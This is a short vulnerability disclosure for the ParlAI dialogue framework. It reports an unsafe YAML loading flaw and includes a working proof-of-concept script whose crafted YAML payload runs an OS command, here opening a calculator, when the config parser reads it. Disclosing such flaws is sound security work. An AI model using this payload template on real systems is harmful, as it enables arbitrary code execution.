# Description
ParlAI is a framework for training and evaluating AI models on a variety of openly available dialogue datasets. 
* **Vulnerability description**
    Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept
Run exploit.py
```
import os
#os.system('pip3 install parlai')
from parlai.chat_service.utils import config
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(payload)
config.parse_configuration_file('config.yml')
```
* `pip3 install parlai`
* `python3 exploit.py`

# Impact
Arbitrary Code Execution
